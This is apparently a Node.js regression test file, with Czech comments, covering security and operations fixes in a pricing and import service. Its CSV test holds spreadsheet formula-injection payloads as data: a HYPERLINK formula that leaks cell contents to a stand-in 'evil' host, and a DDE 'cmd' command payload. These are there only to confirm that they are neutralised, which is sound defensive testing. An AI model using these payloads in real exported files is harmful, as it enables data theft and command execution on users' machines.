'use strict';
// Regresní testy bezpečnostních a provozních nálezů (security-1 … security-7, ops-2, ops-3, ops-6, ops-8, ops-12).
const test = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const zlib = require('node:zlib');
const H = require('./api-routes-helpers');
const { createLogger } = require('../src/util/log');
const { openDb, nowIso } = require('../src/db');
const { readZip, writeZip, toCsv } = require('../src/formats');
const { extractRecords, LIMITS } = require('../src/import/records');
const { fetchSource, runSource, runImport } = require('../src/import/sources');
const { importProducts } = require('../src/import/products');
const { runPricing } = require('../src/engine/run');
const V = require('../src/server/api/_views');

function listen(handler) {
  return new Promise((resolve) => {
    const srv = http.createServer(handler);
    srv.listen(0, '127.0.0.1', () => resolve({ srv, base: `http://127.0.0.1:${srv.address().port}`, close: () => new Promise((r) => srv.close(r)) }));
  });
}

test('security-1: velké JSON tělo (i gzip) → 413 před JSON.parse; server běží dál', async (t) => {
  const { start } = require('../server.js');
  const app = await start({ dbFile: ':memory:', port: 0, host: '127.0.0.1', quiet: true, schedulerEnabled: false, password: H.PASSWORD, maxJsonMb: 0.01, log: createLogger({ level: 'silent' }) });
  t.after(() => app.stop());
  const base = `http://127.0.0.1:${app.port}`;
  const tok = require('../src/server/auth').createToken(app.db, { name: 'r', scopes: ['read'] }).token;
  const big = JSON.stringify({ filter: new Array(20000).fill(0) }); // ~40 kB > 10 kB
  let r = await fetch(base + '/api/v1/segments/preview', { method: 'POST', headers: { Authorization: `Bearer ${tok}`, 'Content-Type': 'application/json' }, body: big });
  assert.equal(r.status, 413);
  r = await fetch(base + '/api/v1/segments/preview', {
    method: 'POST',
    headers: { Authorization: `Bearer ${tok}`, 'Content-Type': 'application/json', 'Content-Encoding': 'gzip' },
    body: zlib.gzipSync(big),
  });
  assert.equal(r.status, 413);
  assert.equal((await fetch(base + '/api/v1/health')).status, 200);
});

test('security-2: JSON import nad limit znaků → chyba importu (ne pád procesu)', () => {
  const old = LIMITS.maxJsonChars;
  LIMITS.maxJsonChars = 1000;
  try {
    assert.throws(() => extractRecords({ text: JSON.stringify(new Array(2000).fill(0)) }), (e) => e.code === 'JSON_TOO_LARGE' && e.status === 413);
  } finally {
    LIMITS.maxJsonChars = old;
  }
});

test('ops-3 / security-2: položka ZIP s deklarovanou obří velikostí se odmítne před rozbalením', () => {
  const zip = writeZip([{ name: 'ceny.csv', data: 'ean;cena\n1;2\n' }]);
  // přepsat nerozbalenou velikost v centrálním adresáři na 300 MB
  const cd = zip.lastIndexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
  zip.writeUInt32LE(300 * 1024 * 1024, cd + 24);
  const entries = readZip(zip);
  assert.throws(() => entries.get('ceny.csv')(), (e) => e.code === 'ZIP_TOO_LARGE');
  assert.throws(() => extractRecords({ buffer: zip, filename: 'ceny.zip' }), (e) => /příliš velká/.test(e.message));
});

test('security-4: přesměrování zdroje na cizí server neposílá API klíč ani Basic auth; na stejný server ano', async () => {
  const seen = [];
  const attacker = await listen((req, res) => {
    seen.push({ where: 'attacker', key: req.headers['x-api-key'], auth: req.headers.authorization });
    res.end('ean;cena\n1;2\n');
  });
  const feed = await listen((req, res) => {
    seen.push({ where: 'feed', url: req.url, key: req.headers['x-api-key'] });
    if (req.url === '/same') {
      res.writeHead(302, { Location: '/data.csv' });
      return res.end();
    }
    if (req.url === '/away') {
      res.writeHead(302, { Location: attacker.base + '/steal' });
      return res.end();
    }
    res.end('ean;cena\n1;2\n');
  });
  try {
    const url = feed.base.replace('http://', 'http://jan:heslo@');
    await fetchSource({ url: url + '/same', headers: { 'X-Api-Key': 'TAJNE' } });
    assert.deepEqual(seen.filter((x) => x.where === 'feed').map((x) => [x.url, x.key]), [['/same', 'TAJNE'], ['/data.csv', 'TAJNE']]);
    const f = await fetchSource({ url: url + '/away', headers: { 'X-Api-Key': 'TAJNE', 'X-Shop-Token': 'T2' } });
    assert.ok(f.buffer.length > 0, 'data z cizího serveru se stáhnou');
    const hit = seen.find((x) => x.where === 'attacker');
    assert.equal(hit.key, undefined, 'API klíč neodešel');
    assert.equal(hit.auth, undefined, 'Basic auth neodešla');
  } finally {
    await feed.close();
    await attacker.close();
  }
});

test('security-5: řazení podle zděděných vlastností objektu (constructor, __proto__) → 400, ne 500 s textem SQLite', async (t) => {
  const app = await H.startApp();
  t.after(() => app.stop());
  const read = app.token(['read']);
  for (const sort of ['constructor', 'toString', '__proto__', 'hasOwnProperty']) {
    const r = await read.get(`/api/v1/proposals?sort=${sort}`);
    assert.equal(r.status, 400, sort);
    const u = await read.get(`/api/v1/unmatched?sort=${sort}`);
    assert.equal(u.status, 400, sort);
  }
});

test('security-5: interní text chyby 500 vidí jen správce', () => {
  const { toHttpError } = require('../src/server/http');
  const err = new Error('near "(": syntax error');
  assert.equal(toHttpError(err, { exposeInternal: false }).details, null);
  // handleError předává exposeInternal jen pro rozsah admin – ověřeno přímo v kódu (ctx.scopes.includes('admin'))
  const src = require('node:fs').readFileSync(require.resolve('../src/server/http.js'), 'utf8');
  assert.match(src, /exposeInternal: !!ctx\.user && Array\.isArray\(ctx\.scopes\) && ctx\.scopes\.includes\('admin'\)/);
});

test('security-6: řazení podle neexistujícího atributu → 400; cache pořadí má omezenou velikost', async (t) => {
  const app = await H.startApp();
  t.after(() => app.stop());
  H.seedBasic(app.db);
  const read = app.token(['read']);
  assert.equal((await read.get('/api/v1/products?sort=attrs.neexistuje123')).status, 400);
  assert.equal((await read.get('/api/v1/products?sort=attrs.N')).status, 200, 'existující atribut');
  const cache = V.getCache(app.db);
  for (let i = 0; i < 200; i++) V.sortedOrder(cache, i % 2 ? 'price' : 'code', i % 4 < 2 ? 'asc' : 'desc');
  for (const f of ['name', 'manufacturer', 'category', 'stock', 'price', 'code', 'margin_pct']) for (const d of ['asc', 'desc']) V.sortedOrder(cache, f, d);
  assert.ok(cache.sortCache.size <= 64);
});

test('security-7: CSV neutralizuje vzorce v textových buňkách (feed i export), čísla nemění', async (t) => {
  const csv = toCsv([{ name: '=HYPERLINK("https://evil/?d="&A1,"x")', m: "=cmd|' /C calc'!A0", p: -3.97, t: '@SUM(1)', ok: 'Kolo' }]);
  assert.ok(csv.includes(`"'=HYPERLINK(`));
  assert.ok(csv.includes(`'=cmd|`));
  assert.ok(csv.includes(';-3,97;'));
  assert.ok(csv.includes(`'@SUM(1)`));
  const app = await H.startApp();
  t.after(() => app.stop());
  H.insertProduct(app.db, { code: 'XSS-1', name: '=HYPERLINK("https://evil.example")', manufacturer: '+cmd', price: 1000 });
  const exp = app.token(['export']);
  const r = await exp.get('/feed/prices.csv');
  assert.equal(r.status, 200);
  assert.ok(r.text.includes(`"'=HYPERLINK(`));
  assert.ok(r.text.includes(`;'+cmd;`));
});

test('ops-2: runSource zapíše pokus PŘED stažením; po restartu se „running“ úlohy označí jako přerušené', async () => {
  const db = openDb();
  const now = nowIso();
  const id = Number(db.prepare("INSERT INTO sources (name, kind, url, interval_minutes, created_at, updated_at) VALUES ('Feed', 'offers', 'http://x/feed.csv', 60, ?, ?)").run(now, now).lastInsertRowid);
  let during = null;
  const res = await runSource(db, id, {
    fetch: async () => {
      during = db.prepare('SELECT last_run_at, last_status FROM sources WHERE id = ?').get(id);
      throw new Error('spadlo');
    },
  });
  assert.equal(res.ok, false);
  assert.ok(during.last_run_at, 'last_run_at je zapsaný před stažením');
  assert.equal(during.last_status, 'running');
  // „pád“ uprostřed importu: řádky ve stavu running
  db.prepare("INSERT INTO imports (kind, origin, started_at, status, stats) VALUES ('offers', 'schedule', ?, 'running', '{}')").run(now);
  db.prepare("INSERT INTO runs (started_at, status, trigger, stats) VALUES (?, 'running', 'schedule', '{}')").run(now);
  db.prepare("UPDATE sources SET last_status = 'running' WHERE id = ?").run(id);
  const { recoverInterrupted } = require('../server.js');
  assert.deepEqual(recoverInterrupted(db), { imports: 1, runs: 1, sources: 1 });
  assert.equal(db.prepare("SELECT COUNT(*) AS n FROM imports WHERE status = 'running'").get().n, 0);
  assert.match(db.prepare("SELECT error FROM imports WHERE status = 'error' ORDER BY id DESC").get().error, /přerušen/);
});

test('ops-6: souběžné spuštění téhož zdroje – druhé skončí hned (busy), stahuje se jen jednou', async () => {
  const db = openDb();
  const now = nowIso();
  const id = Number(db.prepare("INSERT INTO sources (name, kind, url, interval_minutes, created_at, updated_at) VALUES ('Feed', 'offers', 'http://x/feed.csv', 60, ?, ?)").run(now, now).lastInsertRowid);
  let fetches = 0;
  let release;
  const gate = new Promise((r) => (release = r));
  const fetchImpl = async () => {
    fetches++;
    await gate;
    return new Response('ean;konkurent;cena\n8590000000011;X;100\n', { status: 200, headers: { 'Content-Type': 'text/csv' } });
  };
  const p1 = runSource(db, id, { fetch: fetchImpl });
  const r2 = await runSource(db, id, { fetch: fetchImpl });
  assert.equal(r2.busy, true);
  release();
  const r1 = await p1;
  assert.equal(r1.ok, true, r1.error);
  assert.equal(fetches, 1);
  // po dokončení jde zdroj spustit znovu
  const r3 = await runSource(db, id, { fetch: fetchImpl });
  assert.equal(r3.ok, true);
});

test('ops-8: řazení podle návrhu po importu nových produktů (bez invalidace) obsahuje všechny produkty', () => {
  const db = openDb();
  importProducts(db, Array.from({ length: 5 }, (_, i) => ({ code: `P${i}`, price: 100 + i })), { now: '2026-09-20T10:00:00Z' });
  runPricing(db, { now: '2026-09-20T11:00:00Z' });
  let cache = V.getCache(db);
  const count = (c) => V.matchProducts(c, { status: 'active' }, V.sortedOrder(c, 'proposal.change_pct', 'desc')).length;
  assert.equal(count(cache), 5);
  runImport(db, { kind: 'products', input: { text: JSON.stringify([{ code: 'N1', price: 1 }, { code: 'N2', price: 2 }]) }, origin: 'schedule' });
  cache = V.getCache(db);
  assert.equal(cache.views.length, 7);
  assert.equal(count(cache), 7);
});

test('ops-12: nelze-li otevřít databázi, chyba uvádí cestu a radu (práva adresáře)', () => {
  assert.throws(() => openDb('/etc/hostname/nelze/cenotvorba.db'), (e) => /Nelze otevřít databázi \/etc\/hostname\/nelze\/cenotvorba\.db/.test(e.message) && /zapisovatelný/.test(e.message));
});
